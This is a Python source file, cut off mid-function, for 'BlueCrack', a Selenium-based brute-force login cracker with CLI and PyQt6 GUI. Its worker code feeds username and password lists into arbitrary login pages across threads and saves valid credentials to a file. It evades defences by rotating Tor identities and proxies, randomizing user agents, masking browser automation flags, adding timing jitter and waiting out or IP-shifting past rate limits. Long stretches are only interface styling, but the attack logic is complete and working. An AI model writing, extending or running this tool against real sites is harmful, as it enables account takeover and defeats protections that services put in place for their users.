#!/usr/bin/env python3
"""
BlueCrack — Advanced Browser Penetration Framework
===================================================
Hydra-style brute-force tester powered by Selenium WebDriver.
Supports both a PyQt6 GUI and a full-featured CLI with interactive wizard.
"""

__version__ = "2.0.0"

# ═══════════════════════════════════════════════════════════════════
# IMPORTS
# ═══════════════════════════════════════════════════════════════════
import argparse
import builtins
import json
import os
import random
import signal
import sys
import threading
import time
from datetime import datetime
from queue import Queue
from typing import Any, Dict, List, Optional, Set, Tuple

from selenium import webdriver
from selenium.common.exceptions import (
    NoSuchElementException,
    TimeoutException,
    WebDriverException,
)
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait

import keyboard

# Optional: PyQt6 GUI
try:
    from PyQt6.QtCore import QThread, pyqtSignal, Qt, QTimer
    from PyQt6.QtGui import QFont, QColor, QShortcut, QKeySequence, QIcon
    from PyQt6.QtWidgets import (
        QApplication,
        QWidget,
        QVBoxLayout,
        QHBoxLayout,
        QLabel,
        QLineEdit,
        QPushButton,
        QCheckBox,
        QSpinBox,
        QTextEdit,
        QFileDialog,
        QMessageBox,
        QTabWidget,
        QFormLayout,
        QGroupBox,
        QDoubleSpinBox,
        QFrame,
        QSplitter,
        QProgressBar,
        QComboBox,
        QScrollArea,
        QSizePolicy,
    )

    HAS_PYQT = True
except ImportError:
    HAS_PYQT = False

# Optional: Tor IP shifting via stem
try:
    from stem import Signal as TorSignal
    from stem.control import Controller as TorController

    HAS_STEM = True
except ImportError:
    HAS_STEM = False


# ═══════════════════════════════════════════════════════════════════
# CONSTANTS
# ═══════════════════════════════════════════════════════════════════
CSS_PATH_JS: str = """
function cssPath(el){
    if(!el) return null;
    var p=[];
    while(el.nodeType===1){
        var s=el.nodeName.toLowerCase();
        if(el.id){
            s+='#'+el.id;
            p.unshift(s);
            break;
        } else {
            var sib=el, n=1;
            while(sib=sib.previousElementSibling){
                if(sib.nodeName.toLowerCase()==s) n++;
            }
            if(n!=1) s+=':nth-of-type('+n+')';
        }
        p.unshift(s);
        el=el.parentNode;
    }
    return p.join(' > ');
}
return cssPath(arguments[0]);
"""

AUTO_DETECT_JS: str = """
window._autoFindFields = function() {
    let passwordField = document.querySelector('input[type="password"]');
    let userField = null;
    if (passwordField) {
        let inputs = Array.from(
            passwordField.form
                ? passwordField.form.querySelectorAll('input')
                : document.querySelectorAll('input')
        );
        for (let el of inputs) {
            if ((el.type === 'text' || el.type === 'email' || el.name.includes('user')) && el !== passwordField) {
                userField = el;
                break;
            }
        }
    }
    let ucss = userField
        ? userField.tagName.toLowerCase() + (userField.id ? '#'+userField.id : (userField.name ? '[name="'+userField.name+'"]' : ''))
        : null;
    let pcss = passwordField
        ? passwordField.tagName.toLowerCase() + (passwordField.id ? '#'+passwordField.id : (passwordField.name ? '[name="'+passwordField.name+'"]' : ''))
        : null;
    return [ucss, pcss];
};
"""

CLICK_LISTENER_JS: str = """
document.addEventListener('click', function(e){ window._lastClicked = e.target; });
"""

DEFAULT_USER_AGENTS: List[str] = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

DEFAULT_LIMIT_TEXT: str = "too many requests"

# ANSI color helpers
_GREEN = "\033[32m"
_RED = "\033[31m"
_YELLOW = "\033[33m"
_CYAN = "\033[36m"
_BLUE = "\033[34m"
_RESET = "\033[0m"
_BOLD = "\033[1m"

# ── Graceful stop flag (shared between CLI & GUI) ──
_GLOBAL_STOP: threading.Event = threading.Event()
_FOUND_EVENT: threading.Event = threading.Event()


# ═══════════════════════════════════════════════════════════════════
# HELPER FUNCTIONS
# ═══════════════════════════════════════════════════════════════════
def print_banner() -> None:
    """Print the BlueCrack ASCII art banner."""
    print(
        """
\033[34m██████╗ ██╗     ██╗   ██╗███████╗\033[0m \033[31m ██████╗██████╗  █████╗  ██████╗██╗  ██╗\033[0m
\033[34m██╔══██╗██║     ██║   ██║██╔════╝\033[0m \033[31m██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝\033[0m
\033[34m██████╔╝██║     ██║   ██║█████╗  \033[0m \033[31m██║     ██████╔╝███████║██║     █████╔╝ \033[0m
\033[34m██╔══██╗██║     ██║   ██║██╔══╝  \033[0m \033[31m██║     ██╔══██╗██╔══██║██║     ██╔═██╗ \033[0m
\033[34m██████╔╝███████╗╚██████╔╝███████╗\033[0m \033[31m╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗\033[0m
\033[34m╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝\033[0m \033[31m ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\033[0m
"""
    )


print_banner()


def _signal_handler(sig: int, frame: Any) -> None:
    """Handle Ctrl+C / Ctrl+X for graceful shutdown."""
    print(f"\n{_YELLOW}[!] Caught Ctrl+C / Ctrl+X — stopping gracefully...{_RESET}")
    _GLOBAL_STOP.set()
    _FOUND_EVENT.set()


signal.signal(signal.SIGINT, _signal_handler)


def change_tor_ip(control_port: int = 9051, password: Optional[str] = None) -> bool:
    """Request a new Tor identity (new IP).

    Args:
        control_port: Tor control port number.
        password: Optional authentication password for the Tor controller.

    Returns:
        True if identity was successfully changed, False otherwise.
    """
    if not HAS_STEM:
        return False
    try:
        with TorController.from_port(port=control_port) as ctrl:
            if password:
                ctrl.authenticate(password=password)
            else:
                ctrl.authenticate()
            ctrl.signal(TorSignal.NEWNYM)
            return True
    except Exception as e:
        print(f"{_RED}[-] Tor IP shift failed: {e}{_RESET}")
        return False


def build_chrome_options(ctx: Dict[str, Any]) -> webdriver.ChromeOptions:
    """Build ChromeOptions from the given context dictionary.

    Args:
        ctx: Configuration dictionary with keys like 'headless', 'use_tor', 'proxies', etc.

    Returns:
        Configured ChromeOptions instance.
    """
    options = webdriver.ChromeOptions()
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option("useAutomationExtension", False)
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument(f"user-agent={random.choice(DEFAULT_USER_AGENTS)}")

    if ctx.get("use_tor"):
        options.add_argument("--proxy-server=socks5://127.0.0.1:9050")
    elif ctx.get("proxies"):
        options.add_argument(f"--proxy-server={random.choice(ctx['proxies'])}")

    if ctx.get("headless"):
        options.add_argument("--headless=new")
        options.add_argument("--disable-gpu")
        options.add_argument("--window-size=1920x1080")

    return options


def create_driver_safe(
    options: webdriver.ChromeOptions, max_retries: int = 3
) -> Optional[webdriver.Chrome]:
    """Create a Chrome WebDriver with retry logic.

    Args:
        options: Chrome options to use.
        max_retries: Maximum number of creation attempts.

    Returns:
        A Chrome WebDriver instance, or None if all retries failed.
    """
    for attempt in range(max_retries):
        try:
            wd = webdriver.Chrome(options=options)
            return wd
        except WebDriverException as e:
            if attempt < max_retries - 1:
                time.sleep(1)
            else:
                return None
        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(1)
            else:
                return None
    return None


def _save_json_report(
    report_path: str,
    target_url: str,
    metrics: Dict[str, int],
    found_creds: List[Tuple[str, str]],
    start_time: float,
    end_time: float,
) -> None:
    """Save a JSON report of the attack results.

    Args:
        report_path: Output file path for the JSON report.
        target_url: The target URL that was tested.
        metrics: Dictionary of attack metrics.
        found_creds: List of (username, password) tuples found.
        start_time: Unix timestamp when attack started.
        end_time: Unix timestamp when attack ended.
    """
    report = {
        "version": __version__,
        "target_url": target_url,
        "start_time": datetime.fromtimestamp(start_time).isoformat(),
        "end_time": datetime.fromtimestamp(end_time).isoformat(),
        "duration_seconds": round(end_time - start_time, 2),
        "metrics": metrics,
        "credentials_found": [{"username": u, "password": p} for u, p in found_creds],
    }
    try:
        with open(report_path, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════════
# ARGPARSE SETUP
# ═══════════════════════════════════════════════════════════════════
parser = argparse.ArgumentParser(
    description="BlueCrack — Advanced Browser Penetration Framework"
)

# USERNAME INPUT
parser.add_argument("-u", "--user", dest="username", help="single username to test")
parser.add_argument(
    "-U", "--userfile", dest="userfile", help="file containing list of usernames"
)

# PASSWORD INPUT
parser.add_argument("-p", "--passw", dest="password", help="single password to test")
parser.add_argument(
    "-P", "--passlist", dest="passfile", help="file containing list of passwords"
)

# ENGINE
parser.add_argument("--threads", type=int, default=1, help="number of threads")
parser.add_argument("--url", help="login page URL")
parser.add_argument(
    "--error",
    default="",
    help="error message to check for failed login (default: none)",
)
parser.add_argument(
    "--success",
    default="",
    help="success message to verify successful login (if error is inadequate)",
)
parser.add_argument(
    "--headless", action="store_true", help="run worker browsers in headless mode"
)
parser.add_argument(
    "--delay",
    type=float,
    default=0.0,
    help="delay between natural attempts to stay stealthy",
)
parser.add_argument(
    "--limit-text",
    default=DEFAULT_LIMIT_TEXT,
    help="text confirming rate limit hit",
)
parser.add_argument(
    "--cooldown",
    type=int,
    default=12,
    help="cooldown bypass timer to wait out rate blocks",
)
parser.add_argument(
    "--jitter",
    type=float,
    default=0.0,
    help="randomize the delay by up to X seconds to avoid pattern detection",
)
parser.add_argument(
    "--proxy", help="single proxy to use (e.g., http://12.34.56.78:8080)"
)
parser.add_argument(
    "--proxy-list", dest="proxyfile", help="file containing list of proxies to rotate"
)
parser.add_argument(
    "-i",
    "--interactive",
    action="store_true",
    help="launch fully interactive/auto setup wizard",
)
parser.add_argument(
    "--gui", action="store_true", help="launch the PyQt6 GUI instead of CLI"
)

# ── New CLI arguments ──
parser.add_argument(
    "--max-attempts",
    type=int,
    default=0,
    help="maximum total attempts (0 = unlimited)",
)
parser.add_argument(
    "--continue-after-success",
    action="store_true",
    help="continue testing after finding credentials",
)
parser.add_argument(
    "--output",
    type=str,
    default="credentials.txt",
    help="output file path for found credentials (default: credentials.txt)",
)
parser.add_argument(
    "--json-report",
    action="store_true",
    help="save a JSON report when finished",
)

args = parser.parse_args()


# ═══════════════════════════════════════════════════════════════════
# ██  GUI MODE  ██
# ═══════════════════════════════════════════════════════════════════
if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
    if not HAS_PYQT:
        raise SystemExit("PyQt6 not installed. Run: pip install PyQt6 stem")

    # ── Import CUPP helpers ──
    _cupp_dir: str = os.path.dirname(os.path.abspath(__file__))
    sys.path.insert(0, _cupp_dir)
    try:
        import cupp as _cupp_mod
    except ImportError:
        _cupp_mod = None

    # ─────────────────── Premium Glassmorphism Dark Theme ───────────────────
    DARK_STYLE: str = """
    /* ═══ Global ═══ */
    QWidget {
        background-color: #0a0e17;
        color: #e2e8f0;
        font-family: 'Segoe UI', 'Inter', system-ui, sans-serif;
        font-size: 13px;
    }

    /* ═══ Group Boxes — Glassmorphism cards ═══ */
    QGroupBox {
        border: 1px solid rgba(148, 163, 184, 0.1);
        border-radius: 12px;
        margin-top: 18px;
        padding: 26px 14px 14px 14px;
        font-weight: bold;
        font-size: 13px;
        color: #4f8cff;
        background-color: rgba(15, 23, 42, 0.8);
    }
    QGroupBox::title {
        subcontrol-origin: margin;
        subcontrol-position: top left;
        left: 16px;
        top: 4px;
        padding: 0 8px;
        color: #4f8cff;
    }

    /* ═══ Scroll Areas ═══ */
    QScrollArea {
        border: none;
        background: transparent;
    }
    QScrollArea > QWidget > QWidget {
        background: transparent;
    }
    QScrollBar:vertical {
        background: rgba(15, 23, 42, 0.4);
        width: 8px;
        border-radius: 4px;
    }
    QScrollBar::handle:vertical {
        background: rgba(79, 140, 255, 0.3);
        border-radius: 4px;
        min-height: 30px;
    }
    QScrollBar::handle:vertical:hover {
        background: rgba(79, 140, 255, 0.6);
    }
    QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {
        height: 0;
    }

    /* ═══ Tab Widget ═══ */
    QTabWidget::pane {
        border: 1px solid rgba(148, 163, 184, 0.1);
        border-radius: 8px;
        background: rgba(15, 23, 42, 0.5);
        top: -1px;
    }
    QTabBar::tab {
        background: rgba(15, 23, 42, 0.4);
        color: #94a3b8;
        border: none;
        border-bottom: 2px solid transparent;
        padding: 10px 22px;
        margin-right: 2px;
        font-weight: 600;
        font-size: 13px;
    }
    QTabBar::tab:hover {
        color: #e2e8f0;
        background: rgba(79, 140, 255, 0.08);
    }
    QTabBar::tab:selected {
        color: #4f8cff;
        background: rgba(15, 23, 42, 0.8);
        border-bottom: 2px solid #4f8cff;
    }

    /* ═══ Input Fields ═══ */
    QLineEdit, QSpinBox, QDoubleSpinBox, QComboBox {
        background-color: rgba(15, 23, 42, 0.6);
        border: 1px solid rgba(148, 163, 184, 0.15);
        border-radius: 8px;
        padding: 8px 12px;
        color: #e2e8f0;
        min-height: 20px;
        selection-background-color: rgba(79, 140, 255, 0.3);
    }
    QLineEdit:focus, QSpinBox:focus, QDoubleSpinBox:focus, QComboBox:focus {
        border: 1px solid #4f8cff;
        background-color: rgba(15, 23, 42, 0.8);
    }
    QLineEdit::placeholder {
        color: #475569;
    }

    /* ═══ Buttons — Base ═══ */
    QPushButton {
        background-color: rgba(30, 41, 59, 0.8);
        border: 1px solid rgba(148, 163, 184, 0.15);
        border-radius: 8px;
        padding: 9px 18px;
        color: #e2e8f0;
        font-weight: 600;
    }
    QPushButton:hover {
        background-color: rgba(51, 65, 85, 0.9);
        border-color: #4f8cff;
    }
    QPushButton:pressed {
        background-color: rgba(15, 23, 42, 0.9);
    }
    QPushButton:disabled {
        background-color: rgba(15, 23, 42, 0.4);
        color: #334155;
        border-color: rgba(148, 163, 184, 0.05);
    }

    /* ═══ Checkboxes ═══ */
    QCheckBox {
        spacing: 10px;
        color: #e2e8f0;
    }
    QCheckBox::indicator {
        width: 18px;
        height: 18px;
        border-radius: 5px;
        border: 1px solid rgba(148, 163, 184, 0.2);
        background: rgba(15, 23, 42, 0.6);
    }
    QCheckBox::indicator:hover {
        border-color: #4f8cff;
    }
    QCheckBox::indicator:checked {
        background-color: #00e676;
        border-color: #00e676;
    }

    /* ═══ Log Terminal ═══ */
    QTextEdit {
        background-color: #020617;
        border: 1px solid rgba(148, 163, 184, 0.1);
        border-radius: 8px;
        color: #39d353;
        font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
        font-size: 12px;
        padding: 10px;
        selection-background-color: rgba(57, 211, 83, 0.2);
    }

    /* ═══ Progress Bar ═══ */
    QProgressBar {
        background-color: rgba(15, 23, 42, 0.6);
        border: 1px solid rgba(148, 163, 184, 0.1);
        border-radius: 10px;
        text-align: center;
        color: #e2e8f0;
        height: 24px;
        font-weight: 600;
        font-size: 11px;
    }
    QProgressBar::chunk {
        border-radius: 9px;
        background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
            stop:0 #4f8cff, stop:1 #00e676);
    }

    /* ═══ Named Labels ═══ */
    QLabel#titleLabel {
        font-size: 32px;
        font-weight: bold;
        color: #4f8cff;
    }
    QLabel#subtitleLabel {
        font-size: 12px;
        color: #94a3b8;
        font-weight: 400;
    }
    QLabel#statLabel {
        font-size: 12px;
        color: #94a3b8;
        font-weight: 600;
        padding: 2px 8px;
    }
    QLabel#statValue {
        font-size: 13px;
        color: #e2e8f0;
        font-weight: 700;
        padding: 2px 8px;
    }

    /* ═══ Splitter ═══ */
    QSplitter::handle {
        background: rgba(79, 140, 255, 0.15);
        height: 3px;
        border-radius: 1px;
    }
    QSplitter::handle:hover {
        background: rgba(79, 140, 255, 0.4);
    }

    /* ═══ Form label styling ═══ */
    QFormLayout QLabel {
        color: #94a3b8;
        font-weight: 500;
    }

    /* ═══ Tooltips ═══ */
    QToolTip {
        background-color: rgba(15, 23, 42, 0.95);
        color: #e2e8f0;
        border: 1px solid rgba(79, 140, 255, 0.3);
        border-radius: 6px;
        padding: 6px 10px;
        font-size: 12px;
    }
    """

    LIGHT_STYLE: str = """
    QWidget {
        background-color: #f8fafc;
        color: #1e293b;
        font-family: 'Segoe UI', 'Inter', system-ui, sans-serif;
        font-size: 13px;
    }
    QGroupBox {
        border: 1px solid #e2e8f0;
        border-radius: 12px;
        margin-top: 18px;
        padding: 26px 14px 14px 14px;
        font-weight: bold;
        color: #3b82f6;
        background-color: #ffffff;
    }
    QGroupBox::title {
        subcontrol-origin: margin;
        subcontrol-position: top left;
        left: 16px;
        top: 4px;
        padding: 0 8px;
    }
    QScrollArea { border: none; background: transparent; }
    QScrollArea > QWidget > QWidget { background: transparent; }
    QTabWidget::pane {
        border: 1px solid #e2e8f0;
        border-radius: 8px;
        background: #ffffff;
    }
    QTabBar::tab {
        background: #f1f5f9;
        color: #64748b;
        border: none;
        border-bottom: 2px solid transparent;
        padding: 10px 22px;
        margin-right: 2px;
        font-weight: 600;
    }
    QTabBar::tab:selected {
        color: #3b82f6;
        background: #ffffff;
        border-bottom: 2px solid #3b82f6;
    }
    QLineEdit, QSpinBox, QDoubleSpinBox, QComboBox {
        background-color: #ffffff;
        border: 1px solid #e2e8f0;
        border-radius: 8px;
        padding: 8px 12px;
        color: #1e293b;
        min-height: 20px;
    }
    QLineEdit:focus, QSpinBox:focus, QDoubleSpinBox:focus {
        border: 1px solid #3b82f6;
    }
    QPushButton {
        background-color: #f1f5f9;
        border: 1px solid #e2e8f0;
        border-radius: 8px;
        padding: 9px 18px;
        color: #1e293b;
        font-weight: 600;
    }
    QPushButton:hover { background-color: #e2e8f0; border-color: #3b82f6; }
    QPushButton:pressed { background-color: #cbd5e1; }
    QPushButton:disabled { background-color: #f1f5f9; color: #94a3b8; }
    QCheckBox { spacing: 10px; color: #1e293b; }
    QCheckBox::indicator {
        width: 18px; height: 18px; border-radius: 5px;
        border: 1px solid #cbd5e1; background: #ffffff;
    }
    QCheckBox::indicator:checked { background-color: #22c55e; border-color: #22c55e; }
    QTextEdit {
        background-color: #1e293b;
        border: 1px solid #e2e8f0;
        border-radius: 8px;
        color: #4ade80;
        font-family: 'Cascadia Code', 'Consolas', monospace;
        font-size: 12px;
        padding: 10px;
    }
    QProgressBar {
        background-color: #e2e8f0;
        border: 1px solid #cbd5e1;
        border-radius: 10px;
        text-align: center;
        color: #1e293b;
        height: 24px;
    }
    QProgressBar::chunk {
        border-radius: 9px;
        background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #3b82f6, stop:1 #22c55e);
    }
    QLabel#titleLabel { font-size: 32px; font-weight: bold; color: #3b82f6; }
    QLabel#subtitleLabel { font-size: 12px; color: #64748b; }
    QLabel#statLabel { font-size: 12px; color: #64748b; font-weight: 600; padding: 2px 8px; }
    QLabel#statValue { font-size: 13px; color: #1e293b; font-weight: 700; padding: 2px 8px; }
    QSplitter::handle { background: #e2e8f0; height: 3px; }
    QToolTip {
        background-color: #ffffff; color: #1e293b;
        border: 1px solid #e2e8f0; border-radius: 6px; padding: 6px 10px;
    }
    """

    # ─────────────────── GUI Worker Thread ───────────────────
    class GuiWorkerThread(QThread):
        """Worker thread that runs the brute-force attack via Selenium WebDriver.

        Emits log, progress, metrics, and finished signals to the GUI.
        """

        log_signal = pyqtSignal(str)
        progress_signal = pyqtSignal(int, int)  # current, total
        finished_signal = pyqtSignal(bool, str)  # found, message
        metrics_signal = pyqtSignal(dict)  # live metrics for footer

        def __init__(self, ctx: Dict[str, Any]) -> None:
            super().__init__()
            self.ctx: Dict[str, Any] = ctx
            self._stop_flag: threading.Event = threading.Event()
            self._start_time: float = 0.0

        def request_stop(self) -> None:
            """Signal the worker to stop gracefully."""
            self._stop_flag.set()
            _GLOBAL_STOP.set()

        def log(self, msg: str) -> None:
            """Emit a log message to the GUI."""
            self.log_signal.emit(msg)

        def run(self) -> None:
            """Main worker execution: detect selectors then launch attack threads."""
            _GLOBAL_STOP.clear()
            ctx = self.ctx
            users: List[str] = ctx["users"]
            passwords: List[str] = ctx["passwords"]
            total: int = len(users) * len(passwords)
            done: List[int] = [0]
            found_users: Set[str] = set()
            found_creds: List[Tuple[str, str]] = []
            _found_lock = threading.Lock()
            multiple_users: bool = len(users) > 1
            success_msg: str = ctx.get("success_msg", "").lower().strip()
            max_attempts: int = ctx.get("max_attempts", 0)
            continue_after: bool = ctx.get("continue_after_success", False)

            # Retry budget: track retries per (user, pwd)
            retry_budget: Dict[Tuple[str, str], int] = {}
            retry_lock = threading.Lock()
            MAX_RETRIES_PER_COMBO: int = 3

            # Metrics
            metrics: Dict[str, int] = {
                "attempted": 0,
                "successes": 0,
                "failures": 0,
                "errors": 0,
                "rate_limit_hits": 0,
                "skipped_empty": 0,
                "skipped_solved_user": 0,
                "requeued": 0,
                "rate_retry_exhausted": 0,
            }
            metrics_lock = threading.Lock()
            self._start_time = time.time()

            q: Queue = Queue(maxsize=1000)

            def populate() -> None:
                for u in users:
                    for p in passwords:
                        q.put((u, p))

            threading.Thread(target=populate, daemon=True).start()

            # Setup driver for selector detection
            self.log("[*] Opening browser for selector setup...")
            setup_driver = create_driver_safe(webdriver.ChromeOptions())
            if setup_driver is None:
                self.finished_signal.emit(False, "Failed to create setup browser.")
                return

            try:
                setup_driver.get(ctx["target_url"])
                time.sleep(2)
                setup_driver.execute_script(CLICK_LISTENER_JS)
                setup_driver.execute_script(AUTO_DETECT_JS)
                detected = setup_driver.execute_script("return window._autoFindFields();")

                if detected and detected[0] and detected[1]:
                    ctx["username_selector"], ctx["password_selector"] = detected
                    self.log(f"[+] Auto-detected  User: {detected[0]}")
                    self.log(f"[+] Auto-detected  Pass: {detected[1]}")
                else:
                    self.log("[-] Auto-detect failed. Using keyboard fallback...")
                    self.log("    Click username field → press S")
                    self.log("    Click password field → press T")
                    while not (
                        ctx.get("username_selector") and ctx.get("password_selector")
                    ):
                        if self._stop_flag.is_set():
                            setup_driver.quit()
                            self.finished_signal.emit(False, "Stopped by user.")
                            return
                        if keyboard.is_pressed("s"):
                            elem = setup_driver.execute_script(
                                "return window._lastClicked"
                            )
                            if elem:
                                css = setup_driver.execute_script(CSS_PATH_JS, elem)
                                if css:
                                    ctx["username_selector"] = css
                                    self.log(f"[+] Username LOCKED: {css}")
                            time.sleep(0.3)
                        if keyboard.is_pressed("t"):
                            elem = setup_driver.execute_script(
                                "return window._lastClicked"
                            )
                            if elem:
                                css = setup_driver.execute_script(CSS_PATH_JS, elem)
                                if css:
                                    ctx["password_selector"] = css
                                    self.log(f"[+] Password LOCKED: {css}")
                            time.sleep(0.3)
                        time.sleep(0.1)
            except Exception as e:
                self.log(f"[-] Setup error: {e}")
                try:
                    setup_driver.quit()
                except Exception:
                    pass
                self.finished_signal.emit(False, str(e))
                return
            try:
                setup_driver.quit()
            except Exception:
                pass

            self.log(f"[*] Launching {ctx['threads']} worker thread(s)...")

            def _run_worker() -> None:
                options = build_chrome_options(ctx)
                wd = create_driver_safe(options)
                if wd is None:
                    self.log("[-] Thread startup error: could not create WebDriver")
                    return

                tor_counter: int = 0
                try:
                    while (
                        not q.empty()
                        and not self._stop_flag.is_set()
                        and not _GLOBAL_STOP.is_set()
                    ):
                        # Check max attempts
                        if max_attempts > 0:
                            with metrics_lock:
                                if metrics["attempted"] >= max_attempts:
                                    break

                        if not continue_after:
                            if not multiple_users and found_users:
                                break
                            # If single user and already found, stop
                        # Even with continue_after, skip already-solved users
                        # (unless continue_after is True in which case we still test all)

                        try:
                            user, pwd = q.get(timeout=1)
                        except Exception:
                            break

                        if not pwd or not pwd.strip():
                            with metrics_lock:
                                metrics["skipped_empty"] += 1
                            q.task_done()
                            continue

                        if not continue_after and user in found_users:
                            with metrics_lock:
                                metrics["skipped_solved_user"] += 1
                            done[0] += 1
                            self.progress_signal.emit(done[0], total)
                            q.task_done()
                            continue

                        tor_counter += 1
                        if (
                            ctx.get("use_tor")
                            and ctx.get("tor_shift_every", 0) > 0
                            and tor_counter % ctx["tor_shift_every"] == 0
                        ):
                            self.log("[~] Shifting Tor IP...")
                            change_tor_ip(ctx.get("tor_port", 9051))
                            time.sleep(2)

                        try:
                            delay = ctx.get("delay", 0)
                            jitter = ctx.get("jitter", 0)
                            if jitter > 0:
                                delay += random.uniform(0, jitter)
                            if delay > 0:
                                time.sleep(delay)

                            wd.get(ctx["target_url"])
                            wait = WebDriverWait(wd, 5)
                            u_el = wait.until(
                                EC.presence_of_element_located(
                                    (By.CSS_SELECTOR, ctx["username_selector"])
                                )
                            )
                            p_el = wait.until(
                                EC.presence_of_element_located(
                                    (By.CSS_SELECTOR, ctx["password_selector"])
                                )
                            )

                            u_el.clear()
                            u_el.send_keys(user)
                            p_el.clear()
                            p_el.send_keys(pwd)
                            p_el.send_keys(Keys.ENTER)

                            with metrics_lock:
                                metrics["attempted"] += 1

                            self.log(f"[*] Trying: {user} / {pwd}")
                            time.sleep(1)

                            src = ""
                            try:
                                src = wd.page_source.lower()
                            except Exception:
                                pass

                            current_url = ""
                            try:
                                current_url = wd.current_url
                            except Exception:
                                pass

                            # Rate limit check
                            if ctx.get("limit_text") and ctx["limit_text"] in src:
                                self.log("[!] Rate limit hit!")
                                with metrics_lock:
                                    metrics["rate_limit_hits"] += 1

                                # Check retry budget for rate limit
                                combo_key = (user, pwd)
                                with retry_lock:
                                    retry_budget[combo_key] = retry_budget.get(combo_key, 0) + 1
                                    budget_exceeded = retry_budget[combo_key] > MAX_RETRIES_PER_COMBO

                                if budget_exceeded:
                                    self.log(f"[!] Retry budget exhausted for {user}/{pwd}")
                                    with metrics_lock:
                                        metrics["rate_retry_exhausted"] += 1
                                    done[0] += 1
                                    self.progress_signal.emit(done[0], total)
                                    q.task_done()
                                    continue

                                if ctx.get("use_tor"):
                                    change_tor_ip(ctx.get("tor_port", 9051))
                                    time.sleep(3)
                                elif ctx.get("cooldown", 0) > 0:
                                    time.sleep(ctx["cooldown"])

                                q.put((user, pwd))
                                with metrics_lock:
                                    metrics["requeued"] += 1
                                q.task_done()
                                self._emit_metrics(metrics)
                                continue

                            # Error text check
                            if ctx.get("error_msg") and ctx["error_msg"] in src:
                                with metrics_lock:
                                    metrics["failures"] += 1
                                done[0] += 1
                                self.progress_signal.emit(done[0], total)
                                q.task_done()
                                self._emit_metrics(metrics)
                                continue

                            # Determine success
                            is_success = False
                            if success_msg:
                                if success_msg in src:
                                    is_success = True
                            elif current_url and current_url != ctx["target_url"] and "login" not in current_url.lower():
                                is_success = True
                            elif ctx.get("error_msg"):
                                # Error message not found = potential success
                                is_success = True

                            if is_success:
                                with _found_lock:
                                    found_users.add(user)
                                    found_creds.append((user, pwd))
                                self.log(f"\n[+] VALID CREDENTIALS: {user} / {pwd}")
                                with metrics_lock:
                                    metrics["successes"] += 1
                                try:
                                    with open("credentials.txt", "a", encoding="utf-8") as cf:
                                        cf.write(f"{ctx['target_url']} - {user}:{pwd}\n")
                                except Exception:
                                    pass

                                done[0] += 1
                                self.progress_signal.emit(done[0], total)
                                q.task_done()
                                self._emit_metrics(metrics)

                                if not continue_after and not multiple_users:
                                    with q.mutex:
                                        q.queue.clear()
                                    break

                                # Restart browser for clean state
                                try:
                                    wd.quit()
                                except Exception:
                                    pass
                                wd = create_driver_safe(options)
                                if wd is None:
                                    self.log("[-] Could not restart browser after success")
                                    break
                                continue
                            else:
                                # Ambiguous — count as failure
                                with metrics_lock:
                                    metrics["failures"] += 1

                            done[0] += 1
                            self.progress_signal.emit(done[0], total)
                            q.task_done()
                            self._emit_metrics(metrics)

                        except (NoSuchElementException, TimeoutException):
                            self.log(f"[-] Missing elements for {user}, retrying...")
                            combo_key = (user, pwd)
                            with retry_lock:
                                retry_budget[combo_key] = retry_budget.get(combo_key, 0) + 1
                                budget_exceeded = retry_budget[combo_key] > MAX_RETRIES_PER_COMBO

                            if not budget_exceeded:
                                q.put((user, pwd))
                                with metrics_lock:
                                    metrics["requeued"] += 1
                            else:
                                with metrics_lock:
                                    metrics["rate_retry_exhausted"] += 1
                                done[0] += 1
                                self.progress_signal.emit(done[0], total)

                            q.task_done()
                            with metrics_lock:
                                metrics["errors"] += 1
                            try:
                                wd.quit()
                            except Exception:
                                pass
                            wd = create_driver_safe(options)
                            if wd is None:
                                self.log("[-] Could not recreate browser, thread exiting")
                                break

                        except Exception as e:
                            combo_key = (user, pwd)
                            with retry_lock:
                                retry_budget[combo_key] = retry_budget.get(combo_key, 0) + 1
                                budget_exceeded = retry_budget[combo_key] > MAX_RETRIES_PER_COMBO

                            if not budget_exceeded:
                                q.put((user, pwd))
                                with metrics_lock:
                                    metrics["requeued"] += 1
                            else:
                                with metrics_lock:
                                    metrics["rate_retry_exhausted"] += 1
                                done[0] += 1
                                self.progress_signal.emit(done[0], total)

                            q.task_done()
                            msg = str(e).lower()
                            if not any(
                                k in msg
                                for k in (
                                    "invalid session id",
                                    "detached",
                                    "out of memory",
                                    "no such window",
                                )
                            ):
                                self.log(f"[-] Error trying {user}: {e}")
                            with metrics_lock:
                                metrics["errors"] += 1
                            try:
                                wd.quit()
                            except Exception:
                                pass
                            wd = create_driver_safe(options)
                            if wd is None:
                                self.log("[-] Could not recreate browser, thread exiting")
                                break
                finally:
                    try:
                        if wd:
                            wd.quit()
                    except Exception:
                        pass

            threads_list: List[threading.Thread] = []
            for _ in range(ctx["threads"]):
                t = threading.Thread(target=_run_worker, daemon=True)
                t.start()
                threads_list.append(t)
            for t in threads_list:
                t.join()

            end_time = time.time()
            self._emit_metrics(metrics)

            # Auto-save JSON report
